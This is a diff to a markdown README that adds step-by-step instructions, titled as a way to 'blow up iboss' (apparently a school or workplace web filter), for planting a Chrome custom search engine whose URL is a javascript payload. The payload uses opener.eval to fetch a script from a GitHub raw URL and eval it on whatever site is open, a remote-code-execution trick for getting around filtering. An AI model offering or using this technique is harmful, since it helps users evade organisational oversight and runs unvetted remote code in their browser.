@@ -6,6 +6,26 @@
 
 <summary><b>blow up iboss (PATCHED!!!)</b></summary>
 
+1) Head to chrome://settings/searchEngines
+2) Create a Search Engine by using the Add buttom
+3) Paste the following values (you can change this!)
+
+Search engine: gooogle
+
+Shortcut: i love rice
+
+URL with %s in place of query: 
+
+```
+javascript:opener.eval(`
+(async function () {
+    eval((await (await fetch("https://raw.githubusercontent.com/Sreekar617/i-love-rice/main/cod.js")).text()));
+})();`) && close();
+```
+
+4) Then simply just type out "i love rice" in your URL address bar or parts of it; you will notice the epic behavior of it being linked directly to the pasted bookmarklet to run on whatever site
+
+
 1. Bookmark any page
 2. Copy the code below
 ```js
